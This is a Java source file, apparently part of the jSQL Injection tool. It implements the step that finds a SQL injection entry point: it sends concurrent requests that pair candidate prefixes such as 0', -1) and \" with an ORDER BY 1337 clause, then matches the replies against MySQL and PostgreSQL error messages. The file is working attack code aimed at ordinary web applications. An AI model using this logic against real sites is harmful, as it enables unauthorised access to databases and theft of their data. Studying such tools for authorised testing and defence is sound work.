package com.jsql.model.suspendable;

import java.util.concurrent.CompletionService;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorCompletionService;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.apache.log4j.Logger;

import com.jsql.model.MediatorModel;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.StoppedByUserException;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.util.ConnectionUtil;

/**
 * Runnable class, define insertionCharacter that will be used by all futures requests,
 * i.e -1 in "[..].php?id=-1 union select[..]", sometimes it's -1, 0', 0, etc,
 * this class/function tries to find the working one by searching a special error message
 * in the source page.
 */
public class SuspendableGetCharInsertion extends AbstractSuspendable<String> {
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(SuspendableGetCharInsertion.class);

    @Override
    public String run(Object... args) throws InjectionFailureException, StoppedByUserException {
        
        int nbStarInParameter = 0;
        
        if (ConnectionUtil.dataQuery.contains("*")) nbStarInParameter++;
        if (ConnectionUtil.dataRequest.contains("*")) nbStarInParameter++;
        if (ConnectionUtil.dataHeader.contains("*")) nbStarInParameter++;
        
        // Injection Point
        if (nbStarInParameter >= 2) {
            throw new InjectionFailureException("Character * must be used once in GET, POST or Header parameters");
            
        } else if (
            ConnectionUtil.dataQuery.contains("*") 
            && ConnectionUtil.methodInjection != MethodInjection.QUERY
        ) {
            throw new InjectionFailureException("Activate method GET to use character * or remove it from GET parameters");
            
        } else if (
            ConnectionUtil.dataRequest.contains("*") 
            && ConnectionUtil.methodInjection != MethodInjection.REQUEST
        ) {
            throw new InjectionFailureException("Activate method POST to use character * or remove it from POST parameters");
            
        } else if (
            ConnectionUtil.dataHeader.contains("*") 
            && ConnectionUtil.methodInjection != MethodInjection.HEADER
        ) {
            throw new InjectionFailureException("Activate method Header to use character * or remove it from Header parameters");
            
        } 
        
        // Query String
        else if (
            ConnectionUtil.methodInjection == MethodInjection.QUERY 
            && (ConnectionUtil.dataQuery == null || "".equals(ConnectionUtil.dataQuery))
        ) {
            throw new InjectionFailureException("No query string");
            
        } else if (
            !"".equals(ConnectionUtil.dataQuery) 
            && ConnectionUtil.dataQuery.matches("[^\\w]*=.*")
        ) {
            throw new InjectionFailureException("Incorrect query string");
            
        } 
        
        // Request/Header data
        else if (
            !"".equals(ConnectionUtil.dataRequest) 
            && ConnectionUtil.dataRequest.indexOf("=") < 0
        ) {
            throw new InjectionFailureException("Incorrect POST datas");
            
        } else if (
            !"".equals(ConnectionUtil.dataHeader) 
            && ConnectionUtil.dataHeader.indexOf(":") < 0
        ) {
            throw new InjectionFailureException("Incorrect HEADER datas");
            
        // Parse query information: url=>everything before the sign '=',
        // start of query string=>everything after '='
        } else if (ConnectionUtil.methodInjection == MethodInjection.QUERY) {
            if (ConnectionUtil.dataQuery.contains("*")) {
                return "";
            } else if (!ConnectionUtil.dataQuery.matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.dataQuery);
                regexSearch.find();
                try {
                    ConnectionUtil.dataQuery = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect GET format");
                }
            }
            
        // Parse post information
        } else if (ConnectionUtil.methodInjection == MethodInjection.REQUEST) {
            if (ConnectionUtil.dataRequest.contains("*")) {
                return "";
            } else if (!ConnectionUtil.dataRequest.matches(".*=$")) {
                Matcher regexSearch = Pattern.compile("(.*=)(.*)").matcher(ConnectionUtil.dataRequest);
                regexSearch.find();
                try {
                    ConnectionUtil.dataRequest = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect POST format");
                }
            }
        // Parse header information
        } else if (ConnectionUtil.methodInjection == MethodInjection.HEADER) {
            if (ConnectionUtil.dataHeader.contains("*")) {
                return "";
            } else if (!ConnectionUtil.dataHeader.matches(".*:$")) {
                Matcher regexSearch = Pattern.compile("(.*:)(.*)").matcher(ConnectionUtil.dataHeader);
                regexSearch.find();
                try {
                    ConnectionUtil.dataHeader = regexSearch.group(1);
                    return regexSearch.group(2);
                } catch (IllegalStateException e) {
                    throw new InjectionFailureException("Incorrect Header format");
                }
            }
        }

        // Parallelize the search and let the user stops the process if needed.
        // SQL: force a wrong ORDER BY clause with an inexistent column, order by 1337,
        // and check if a correct error message is sent back by the server:
        //         Unknown column '1337' in 'order clause'
        // or   supplied argument is not a valid MySQL result resource
        ExecutorService taskExecutor = Executors.newCachedThreadPool();
        CompletionService<CallableHTMLPage> taskCompletionService = new ExecutorCompletionService<>(taskExecutor);
        for (String insertionCharacter : new String[] {"0", "0'", "'", "-1", "1", "\"", "-1)", "-1))"}) {
            taskCompletionService.submit(
                new CallableHTMLPage(
                    insertionCharacter + 
                    MediatorModel.model().vendor.getValue().getSqlOrderBy(),
                    insertionCharacter
                )
            );
        }

        int total = 7;
        while (0 < total) {

            if (this.isSuspended()) {
                throw new StoppedByUserException();
            }
            
            try {
                CallableHTMLPage currentCallable = taskCompletionService.take().get();
                total--;
                String pageSource = currentCallable.getContent();
                
                if (
                    Pattern.compile(".*Unknown column '1337' in 'order clause'.*", Pattern.DOTALL).matcher(pageSource).matches() || 
                    Pattern.compile(".*supplied argument is not a valid MySQL result resource.*", Pattern.DOTALL).matcher(pageSource).matches()
                ) {
                    // the correct character: mysql
                    return currentCallable.getInsertionCharacter();
                } else if (Pattern.compile(".*ORDER BY position 1337 is not in select list.*", Pattern.DOTALL).matcher(pageSource).matches()) {
                    // the correct character: postgresql
                    return currentCallable.getInsertionCharacter();
                }
            } catch (InterruptedException | ExecutionException e) {
                LOGGER.error("Interruption while determining character injection", e);
            }
            
        }

        // Nothing seems to work, forces 1 has the character
        return "1";
    }
}